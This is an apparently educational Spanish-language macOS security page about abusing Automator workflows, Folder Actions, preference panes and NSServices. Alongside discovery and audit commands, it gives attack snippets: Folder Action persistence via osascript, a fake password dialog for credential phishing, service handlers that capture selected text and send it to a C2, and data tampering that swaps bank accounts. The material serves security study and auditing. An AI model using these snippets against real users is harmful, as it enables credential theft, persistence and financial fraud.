# Abuse de Automator, Preference Panes y NSServices en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Actions y Workflows de Automator

### Información básica

**Automator** es la herramienta visual de automatización de macOS. Ejecuta **workflows** (bundles `.workflow`) compuestos por **actions** (bundles `.action`). Automator también impulsa la integración con **Folder Actions**, **Quick Actions** y **Shortcuts**. En las versiones modernas de macOS, los workflows también se pueden **importar en Shortcuts**, por lo que la misma lógica maliciosa puede aparecer como una Quick Action del Finder, un servicio de usuario en `~/Library/Services/` o un shortcut basado en actions heredadas de Automator.

Las actions de Automator son **plugins** cargados en el runtime de Automator cuando se ejecuta un workflow. Pueden:
- Ejecutar shell scripts arbitrarios
- Procesar archivos y datos
- Interactuar con aplicaciones mediante AppleScript
- Encadenarse para crear automatizaciones complejas

### Por qué es importante

> [!WARNING]
> Los workflows de Automator pueden inducir a su ejecución mediante **ingeniería social**: parecen simples archivos de documentos. Un bundle `.workflow` puede contener comandos de shell incrustados que se ejecutan cuando se inicia el workflow. Combinados con Folder Actions, proporcionan **persistencia automática** que se activa ante eventos de archivos. Las correcciones recientes de Gatekeeper también demostraron que las **Quick Actions incluidas en aplicaciones** (`Contents/PlugIns/*.workflow`) deben tratarse como contenido ejecutable, no como datos inofensivos.

### Descubrimiento
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Flujo de trabajo mediante ingeniería social

Un paquete `.workflow` parece un archivo de documento normal para la mayoría de los usuarios:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions ejecuta automáticamente un workflow cuando se añaden archivos a una carpeta monitorizada:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persisten tras los reinicios y se ejecutan silenciosamente. Una Folder Action en `~/Downloads` significa que **cada archivo descargado activa tu payload**, incluidos los archivos de Safari, Chrome, AirDrop y los adjuntos de correo electrónico. Ten en cuenta también que `System Events` puede registrar Folder Actions que apunten a scripts fuera de las ubicaciones predeterminadas de `~/Library/Scripts/Folder Action Scripts`, por lo que merece la pena buscar rutas sueltas. Para conocer las implicaciones relacionadas con TCC, consulta [la página de TCC](../macos-security-protections/macos-tcc/README.md).

---

## Paneles de preferencias

### Información básica

Los paneles de preferencias (bundles `.prefPane`) son plugins cargados por **System Settings** (anteriormente System Preferences). Proporcionan paneles de interfaz de configuración para funciones del sistema o de terceros. En sistemas antiguos, `System Preferences` los cargaba directamente; en versiones más recientes, los paneles de terceros suelen ser gestionados por un **servicio XPC legacy loader** iniciado desde System Settings.

### Por qué es importante

- Los paneles de preferencias se ejecutan en un **proceso host de confianza** creado por System Settings / System Preferences
- En sistemas modernos, ese host puede ser un **servicio XPC `legacyLoader`**, por lo que el límite importante sigue siendo **proceso de interfaz de usuario de Apple de confianza -> carga de código de terceros**
- Los paneles de preferencias de terceros heredan el **contexto de seguridad del proceso host** y la confianza del usuario asociada a esa interfaz
- Los usuarios instalan paneles de preferencias haciendo **doble clic** sobre ellos, lo que facilita la ingeniería social
- Una vez instalados, **persisten** y se cargan cada vez que System Settings abre ese panel

### Descubrimiento
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Secuestro del contexto de privilegios

Un preference pane malicioso hereda el contexto de seguridad del **host del panel** (históricamente `System Preferences`; en versiones más recientes, a menudo un helper `legacyLoader` iniciado por `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Ataque: Persistencia mediante instalación
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Un panel de preferencias puede imitar paneles legítimos de la interfaz de usuario del sistema para **phishing de credenciales**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Información básica

**NSServices** permite que las aplicaciones proporcionen funcionalidades a otras apps mediante el **menú Services** (clic derecho → Services). Cuando un usuario selecciona texto o datos e invoca un servicio, los datos seleccionados se **envían al proveedor del servicio** para su procesamiento.

Los servicios se declaran en el `Info.plist` de una aplicación bajo la clave `NSServices` y se registran con el servidor de pasteboard (`pbs`). macOS también mantiene una **caché de servicios** y una **política de restricciones** que determinan qué servicios son visibles y si los callers sandboxed deben recibir una advertencia adicional.

### Por qué es importante

- Los servicios reciben **flujo de datos entre aplicaciones**: el texto seleccionado de cualquier aplicación se envía al servicio
- Un servicio malicioso captura datos de password managers, clientes de correo y aplicaciones financieras
- Los servicios pueden **devolver datos modificados** a la aplicación que realiza la llamada (man-in-the-middle en operaciones de selección)
- Los nombres de los servicios pueden diseñarse para parecer legítimos ("Format Text", "Encrypt Selection", "Share")
- El flag opcional `NSRestricted` es relevante para la seguridad: un servicio marcado como unrestricted puede ser invocado por una app sandboxed sin la advertencia que macOS muestra para los servicios propensos a escape<sup>[2]</sup>

### Descubrimiento
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Ataque: Servicio de interceptación de datos
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Ataque: Modificación de datos (Man-in-the-Middle)

Un servicio puede **modificar los datos devueltos** mientras aparenta proporcionar una función legítima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Services restringidos y abuso moderno

Apple admite un booleano opcional `NSRestricted` por definición de servicio. Si está establecido, macOS advierte a los callers en sandbox porque el servicio podría ayudarles a **escapar de los límites del sandbox o de privacidad**. Desde una perspectiva ofensiva, esto ofrece dos vías de auditoría útiles:

- Buscar **services de terceros que no estén marcados como restringidos**, aunque actúen como proxy de Apple Events, acceso a archivos u otras acciones privilegiadas
- Buscar **services integrados de alto valor** con entitlements potentes (por ejemplo, services expuestos por Script Editor o helpers respaldados por Finder) y comprobar si la interacción del usuario basta para convertirlos en una primitiva de acceso a datos

Un buen ejemplo reciente es **CVE-2022-48574**, donde el mecanismo de Services podía abusarse para acceder a **archivos de usuario protegidos por TCC sin el flujo de confirmación esperado**. El bug está corregido, pero la técnica sigue siendo útil para el threat modeling: cualquier servicio que reenvíe solicitudes de acceso a archivos o de automation en nombre del caller merece el mismo escrutinio.<sup>[2]</sup>

---

## Notas de seguridad recientes

- **Quick Actions son contenido ejecutable**: Apple corrigió en 2024 un bypass de Gatekeeper por el que una Quick Action de Automator incluida en una app podía ejecutarse sin la evaluación normal. Al auditar apps, inspecciona `Contents/PlugIns/*.workflow/Contents/document.wflow` exactamente igual que inspeccionarías helper scripts o login items. Consulta [la página de Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[1]</sup>
- **Shortcuts pueden heredar el comportamiento antiguo de Automator**: Apple también añadió un prompt adicional de consentimiento del usuario después de descubrir que shortcuts de terceros utilizaban una **legacy Automator action** para enviar Apple Events sin el flujo de permisos esperado. Los workflows importados y los bundles de shortcuts deben revisarse en busca de `Run AppleScript`, `Run Shell Script` y acciones bridge similares. Consulta [la página de TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator sigue siendo un límite de privacidad activo**: Apple publicó otra corrección para Automator en 2025 relacionada con el acceso a datos de usuario protegidos. Aunque Automator sea una superficie legacy, trata cualquier workflow runner, host de Quick Actions o automation bridge como una attack surface actual, no como código muerto.

---

## Cadenas de ataque entre técnicas

### Folder Action de Automator → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panel de preferencias → Escalada de TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Robo de Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referencias

- [1] [Apple — Acerca del contenido de seguridad de macOS Ventura 13.7, Sonoma 14.7 y Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Cómo funcionó el exploit de NSServices en macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
